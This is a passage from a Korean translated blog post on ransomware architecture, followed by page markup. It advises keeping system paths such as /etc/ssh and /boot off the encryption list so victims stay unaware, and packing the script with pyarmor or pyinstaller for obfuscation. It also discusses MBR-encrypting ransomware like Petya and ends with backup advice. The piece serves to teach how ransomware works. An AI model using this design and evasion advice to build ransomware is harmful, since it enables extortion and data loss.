&lt;p&gt;&amp;#xC624;&amp;#xB958; &amp;#xAC80;&amp;#xC0AC;(&amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xC791;&amp;#xC5C5;&amp;#xC5D0; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB85C; public key&amp;#xAC00; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xB294;&amp;#xC9C0;, decrypt&amp;#xC5D0; private key&amp;#xAC00; &amp;#xC788;&amp;#xB294;&amp;#xC9C0; &amp;#xB4F1;) &amp;#xC678;&amp;#xC5D0;&amp;#xB3C4; &amp;#xC6B4;&amp;#xC601; &amp;#xCCB4;&amp;#xC81C;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xD30C;&amp;#xC77C; &amp;#xBC0F; &amp;#xD3F4;&amp;#xB354;&amp;#xB97C; &amp;#xD654;&amp;#xC774;&amp;#xD2B8; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB85C; &amp;#xC9C0;&amp;#xC815;&amp;#xD574;&amp;#xC57C; &amp;#xD55C;&amp;#xB2E4;. &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB418;&amp;#xB354;&amp;#xB77C;&amp;#xB3C4; &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130;&amp;#xB294; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD574;&amp;#xC57C; &amp;#xD55C;&amp;#xB2E4;. &amp;#xBAA8;&amp;#xB4E0; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD55C;&amp;#xB2E4;&amp;#xBA74; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC740; &amp;#xACB0;&amp;#xACFC;&amp;#xB97C; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xAC00; &amp;#xBB54;&amp;#xAC00; &amp;#xC798;&amp;#xBABB;&amp;#xB41C; &amp;#xAC78; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC774; &amp;#xBD88;&amp;#xAC00;&amp;#xB2A5;&amp;#xD574;&amp;#xC9C4;&amp;#xB2E4;.&lt;/li&gt;
&lt;li&gt;&amp;#xC804;&amp;#xBD80; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xD6C4;, &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC774; &amp;#xBD80;&amp;#xD305;&amp;#xC774; &amp;#xC548;&amp;#xB418;&amp;#xACE0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xB294; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xC5D0; &amp;#xAC10;&amp;#xC5FC;&amp;#xB41C; &amp;#xC0AC;&amp;#xC2E4;&amp;#xC744; &amp;#xC54C;&amp;#xC9C0; &amp;#xBABB;&amp;#xD55C;&amp;#xB2E4;.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&amp;#xC608;&amp;#xC2DC;&amp;#xB85C; &amp;#xB9AC;&amp;#xB205;&amp;#xC2A4; &amp;#xD654;&amp;#xC774;&amp;#xD2B8; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs ini&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;whitelist&lt;/span&gt; = [&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/etc/ssh&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/etc/pam.d&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/etc/security/&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/boot&amp;quot;&lt;/span&gt;,
&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/run&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/usr&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/snap&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/var&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/sys&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/proc&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/dev&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/bin&amp;quot;&lt;/span&gt;,
&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/sbin&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/lib&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;passwd&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;shadow&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;known_hosts&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;sshd_config&amp;quot;&lt;/span&gt;,
&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/home/sec/.viminfo&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;/etc/crontab&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/etc/default/locale&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/etc/environment&amp;quot;&lt;/span&gt;]&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;.py&lt;/code&gt; &amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xB97C; &amp;#xBAA8;&amp;#xB4E0; dependency&amp;#xC640; &amp;#xD568;&amp;#xAED8; &amp;#xC555;&amp;#xCD95;&amp;#xD558;&amp;#xC5EC; &amp;#xB2E8;&amp;#xC77C; &amp;#xC2E4;&amp;#xD589; &amp;#xD30C;&amp;#xC77C;&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;. &amp;#xC77C;&amp;#xC77C;&amp;#xC774; &amp;#xC54C;&amp;#xB824;&amp;#xC8FC;&amp;#xC9C4; &amp;#xC54A;&amp;#xACA0;&amp;#xC9C0;&amp;#xB9CC; &lt;a href=&#34;https://pypi.org/project/pyarmor/&#34;&gt;pyarmor&lt;/a&gt;&amp;#xC640; &lt;a href=&#34;https://www.pyinstaller.org/&#34;&gt;pyinstaller&lt;/a&gt;&amp;#xB97C; &amp;#xCC3E;&amp;#xC544;&amp;#xBCF4;&amp;#xBA74; &amp;#xB41C;&amp;#xB2E4;. &amp;#xB610; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB824;&amp;#xB294; &amp;#xB09C;&amp;#xB3C5;&amp;#xD654;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &lt;a href=&#34;https://github.com/Nuitka/Nuitka&#34;&gt;Nuitka&lt;/a&gt;&amp;#xAC00; &amp;#xB3C4;&amp;#xC6C0;&amp;#xC774; &amp;#xB420; &amp;#xC218;&amp;#xB3C4; &amp;#xC788;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;&amp;#xB2E4;&amp;#xB978;-&amp;#xC885;&amp;#xB958;&amp;#xC758;-&amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;-MBR-&amp;#xC554;&amp;#xD638;&amp;#xD654;&#34;&gt;&lt;a href=&#34;#&amp;#xB2E4;&amp;#xB978;-&amp;#xC885;&amp;#xB958;&amp;#xC758;-&amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;-MBR-&amp;#xC554;&amp;#xD638;&amp;#xD654;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xB2E4;&amp;#xB978; &amp;#xC885;&amp;#xB958;&amp;#xC758; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;(MBR &amp;#xC554;&amp;#xD638;&amp;#xD654;)&#34;&gt;&lt;/a&gt;&amp;#xB2E4;&amp;#xB978; &amp;#xC885;&amp;#xB958;&amp;#xC758; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;(MBR &amp;#xC554;&amp;#xD638;&amp;#xD654;)&lt;/h1&gt;&lt;p&gt;&amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xB4DC;&amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xC758; &lt;a href=&#34;https://en.wikipedia.org/wiki/Master_boot_record&#34;&gt;Master Boot Record&lt;/a&gt;&amp;#xB97C; &amp;#xAC10;&amp;#xC5FC;&amp;#xC2DC;&amp;#xD0A4;&amp;#xB294; &amp;#xB2E4;&amp;#xB978; &amp;#xC885;&amp;#xB958;&amp;#xC758; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xAC00; &amp;#xC788;&amp;#xB2E4;. &amp;#xD30C;&amp;#xC77C; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC758; NTFS &amp;#xD30C;&amp;#xC77C; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC744; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD558;&amp;#xB294; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xC5EC; &amp;#xB514;&amp;#xC2A4;&amp;#xD06C;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E0;&amp;#xB2E4;. &amp;#xC774; &amp;#xBC29;&amp;#xBC95;&amp;#xC740; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xC758; &amp;#xC791;&amp;#xC740; &amp;#xBD80;&amp;#xBD84;&amp;#xB9CC; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD558;&amp;#xBA74; &amp;#xB3FC;&amp;#xC11C; &amp;#xB9E4;&amp;#xC6B0; &amp;#xBE60;&amp;#xB974;&amp;#xB2E4;. &lt;a href=&#34;https://en.wikipedia.org/wiki/Petya_(malware&#34;&gt;Petya &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&lt;/a&gt;)&amp;#xAC00; &amp;#xC774; &amp;#xC885;&amp;#xB958;&amp;#xC758; &amp;#xC644;&amp;#xBCBD;&amp;#xD55C; &amp;#xC608;&amp;#xC2DC;&amp;#xC774;&amp;#xB2E4;. &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC774;&amp;#xB294; 3&amp;#xAC1C;&amp;#xC758; &amp;#xC8FC;&amp;#xC694;&amp;#xD55C; &amp;#xB2E8;&amp;#xC810;&amp;#xC744; &amp;#xAC00;&amp;#xC9C0;&amp;#xACE0; &amp;#xC788;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8;&amp;#xB85C; OS&amp;#xB97C; &amp;#xBD80;&amp;#xD305;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xC5B4;&amp;#xB3C4; &amp;#xD3EC;&amp;#xB80C;&amp;#xC2DD; &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;. &amp;#xD30C;&amp;#xC77C;&amp;#xB4E4;&amp;#xC740; &amp;#xC0AD;&amp;#xC81C;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xACE0; &amp;#xD30C;&amp;#xC77C; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0;&amp;#xC11C; &amp;#xCC38;&amp;#xC870;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC744; &amp;#xB420; &amp;#xBFD0;&amp;#xC774;&amp;#xB2E4;. &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130;&amp;#xAC00; &amp;#xC7AC;&amp;#xBD80;&amp;#xD305; &amp;#xB41C; &amp;#xD6C4;&amp;#xC5D0; raw data&amp;#xB97C; &amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xD558;&amp;#xB354;&amp;#xB77C;&amp;#xB3C4; victim&amp;#xC774; &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130;&amp;#xB97C; &amp;#xB044;&amp;#xACE0; &amp;#xB514;&amp;#xC2A4;&amp;#xD06C;&amp;#xB97C; &amp;#xBE7C;&amp;#xBC84;&amp;#xB9AC;&amp;#xBA74; &amp;#xC77C;&amp;#xBD80; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xB2E8;&amp;#xC810;&amp;#xC740; &amp;#xB300;&amp;#xBD80;&amp;#xBD84; &lt;a href=&#34;https://www.howtogeek.com/193669/whats-the-difference-between-gpt-and-mbr-when-partitioning-a-drive/&#34;&gt;&amp;#xCD5C;&amp;#xC2E0; OS&amp;#xB294; GPT(GUID Partition Table)&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; MBR&amp;#xC744; &amp;#xB354; &amp;#xC774;&amp;#xC0C1; &amp;#xC4F0;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294;&amp;#xB2E4;&lt;/a&gt;&amp;#xB294; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC138; &amp;#xBC88;&amp;#xC9F8; &amp;#xB2E8;&amp;#xC810;&amp;#xC740; &amp;#xD30C;&amp;#xC77C; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xC758;&amp;#xC874;&amp;#xC131;&amp;#xC774; &amp;#xB192;&amp;#xACE0; NTFS&amp;#xCC98;&amp;#xB7FC; &amp;#xB3D9;&amp;#xC791;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294; &amp;#xD30C;&amp;#xC77C; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;(EXT3/EXT4, ZFS &amp;#xB4F1;)&amp;#xB3C4; &amp;#xACE0;&amp;#xB824;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xC218;&amp;#xC815;&amp;#xD574;&amp;#xC57C; &amp;#xD55C;&amp;#xB2E4;&amp;#xB294; &amp;#xC810;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774; &amp;#xBC29;&amp;#xBC95;&amp;#xC740; &amp;#xB354; &amp;#xB9CE;&amp;#xC740; low-level technical concept&amp;#xC744; &amp;#xC694;&amp;#xAD6C;&amp;#xD558;&amp;#xC5EC; &amp;#xC774; &amp;#xAC8C;&amp;#xC2DC;&amp;#xAE00;&amp;#xC5D0;&amp;#xC11C; &amp;#xB9CE;&amp;#xC774; &amp;#xC124;&amp;#xBA85;&amp;#xD558;&amp;#xACE0; &amp;#xC2F6;&amp;#xC9C0; &amp;#xC54A;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &amp;#xC774; &amp;#xBC29;&amp;#xBC95;&amp;#xB860;&amp;#xC740; &amp;#xB9CE;&amp;#xC774; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294;&amp;#xB2E4;. &amp;#xD544;&amp;#xC790;&amp;#xC758; &amp;#xC8FC;&amp;#xBAA9;&amp;#xC801;&amp;#xC740; &amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC778; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xB3C5;&amp;#xC790;&amp;#xB4E4;&amp;#xC774; &amp;#xB354; &amp;#xC798; &amp;#xC774;&amp;#xD574;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;&amp;#xACB0;&amp;#xB860;&#34;&gt;&lt;a href=&#34;#&amp;#xACB0;&amp;#xB860;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xACB0;&amp;#xB860;&#34;&gt;&lt;/a&gt;&amp;#xACB0;&amp;#xB860;&lt;/h1&gt;&lt;p&gt;&amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xB97C; &amp;#xBC29;&amp;#xC9C0;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xB4E4;(&amp;#xCD9C;&amp;#xCC98;&amp;#xB97C; &amp;#xC54C; &amp;#xC218; &amp;#xC5C6;&amp;#xB294; &amp;#xD30C;&amp;#xC77C; &amp;#xC5F4;&amp;#xC9C0; &amp;#xB9D0;&amp;#xAE30;, &amp;#xC778;&amp;#xD504;&amp;#xB77C; &amp;#xC5C5;&amp;#xB370;&amp;#xC774;&amp;#xD2B8; &amp;#xC720;&amp;#xC9C0;, &amp;#xC548;&amp;#xD2F0; &amp;#xBA40;&amp;#xC6E8;&amp;#xC5B4; &amp;#xC18C;&amp;#xD504;&amp;#xD2B8;&amp;#xC6E8;&amp;#xC5B4; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xAE30; &amp;#xB4F1;&amp;#xB4F1;) &amp;#xC678;&amp;#xC5D0;&amp;#xB3C4; &amp;#xCD94;&amp;#xCC9C;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xC740; &amp;#xBC31;&amp;#xC5C5;&amp;#xACFC; &amp;#xBC31;&amp;#xC5C5; &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xB610; &amp;#xBC31;&amp;#xC5C5;&amp;#xC774;&amp;#xB2E4;. &amp;#xACF5;&amp;#xACA9;&amp;#xC744; &amp;#xB9C9;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; &amp;#xB9CE;&amp;#xC740; &amp;#xC870;&amp;#xC5B8;&amp;#xC744; &amp;#xB4E3;&amp;#xAC8C; &amp;#xB418;&amp;#xACA0;&amp;#xC9C0;&amp;#xB9CC; &amp;#xD544;&amp;#xC790;&amp;#xC758; &amp;#xC0DD;&amp;#xAC01;&amp;#xC5D0;&amp;#xB294; &amp;#xADF8;&amp;#xB0E5; &amp;#xAC78;&amp;#xB9B4; &amp;#xAC70;&amp;#xB77C; &amp;#xC0DD;&amp;#xAC01;&amp;#xD558;&amp;#xACE0; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC624;&amp;#xD504;&amp;#xB77C;&amp;#xC778; &amp;#xBC31;&amp;#xC5C5;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%207.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xB2F9;&amp;#xC2E0;&amp;#xC774; &amp;#xAC10;&amp;#xC5FC;&amp;#xC744; &amp;#xD53C;&amp;#xD55C;&amp;#xB2E4; &amp;#xD574;&amp;#xB3C4; &amp;#xB3D9;&amp;#xB8CC; &amp;#xC9C1;&amp;#xC6D0;&amp;#xC774; &amp;#xAC78;&amp;#xB9AC;&amp;#xBA74; &amp;#xB9E4;&amp;#xD551;&amp;#xB41C; &amp;#xACF5;&amp;#xC720; &amp;#xB4DC;&amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xC758; &amp;#xBAA8;&amp;#xB4E0; &amp;#xD30C;&amp;#xC77C;&amp;#xC774; &amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xB420; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;&amp;#xC73C;&amp;#xB85C; &amp;#xC544;&amp;#xBB34;&amp;#xB3C4; &amp;#xCD94;&amp;#xCC9C;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xBC29;&amp;#xBC95;: &amp;#xAC10;&amp;#xC5FC;&amp;#xB41C; &amp;#xACBD;&amp;#xC6B0;, &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xD30C;&amp;#xC77C;(&amp;#xAC00;&amp;#xC871;&amp;#xC0AC;&amp;#xC9C4;, &amp;#xBE44;&amp;#xB514;&amp;#xC624; &amp;#xB4F1;)&amp;#xC744; &amp;#xBC14;&amp;#xB85C; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD560; &amp;#xD544;&amp;#xC694;&amp;#xAC00; &amp;#xC5C6;&amp;#xC73C;&amp;#xBA74; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xBCF5;&amp;#xC0AC;&amp;#xBCF8;&amp;#xC744; &amp;#xBCF4;&amp;#xAD00;&amp;#xD574;&amp;#xB77C;. &amp;#xBA40;&amp;#xC6E8;&amp;#xC5B4; &amp;#xAC1C;&amp;#xBC1C;&amp;#xC790;&amp;#xAC00; &amp;#xC740;&amp;#xD1F4;(Shade, TeslaCrypt, HildaCrypt)&amp;#xD558;&amp;#xAC70;&amp;#xB098; &amp;#xCCB4;&amp;#xD3EC;(CoinVault)&amp;#xB418;&amp;#xAC70;&amp;#xB098; &amp;#xACBD;&amp;#xC7C1;&amp;#xC790;&amp;#xC758; &amp;#xD0A4;&amp;#xB97C; &amp;#xBC30;&amp;#xD3EC;(Petya vs Chimera)&amp;#xD558;&amp;#xB294; &amp;#xB4F1; &amp;#xD574;&amp;#xB3C5; &amp;#xD0A4;&amp;#xAC00; &amp;#xACF5;&amp;#xAC1C;&amp;#xB420; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;. &amp;#xC6B4; &amp;#xC88B;&amp;#xC73C;&amp;#xBA74; &amp;#xBA87; &amp;#xB2EC; &amp;#xC548;&amp;#xC5D0; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;.&lt;/p&gt;
&lt;/blockquote&gt;
 - hack &amp; life">
  <meta property="og:image" content="https://hackyboiz.github.io/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%205.png">
  <meta property="og:url" content="https://hackyboiz.github.io/">

  <link rel="canonical" href="https://hackyboiz.github.io/2021/04/25/idioth/arch_of_ransomware_part2/">

  <title>[Translation] Architecture of Ransomware Part 2 - hackyboiz</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
  

  


<!--  -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
<link rel="stylesheet" href="/.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
<link rel="stylesheet" href="/.css">


<link rel="stylesheet" href="/css/main.css">

<!--  -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>

<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
</head>


<body>
  <header style="height: 40vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-addrcard"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/author/">
                <i class="iconfont icon-user-fill"></i>
                Author
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2021-04-25 14:00" pubdate>
      2021 4 25 
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      3.7k 
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      74
       
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2">
      <script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    </div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">[Translation] Architecture of Ransomware Part 2</h1>
                       
            <div class="markdown-body" id="post-body">
              <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
              <!-- hackyboiz_horizen_index -->
              <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-3672652207808168" data-ad-slot="8887862313" data-ad-format="auto" data-full-width-responsive="true"></ins>
              <script>
                   (adsbygoogle = window.adsbygoogle || []).push({});
              </script>
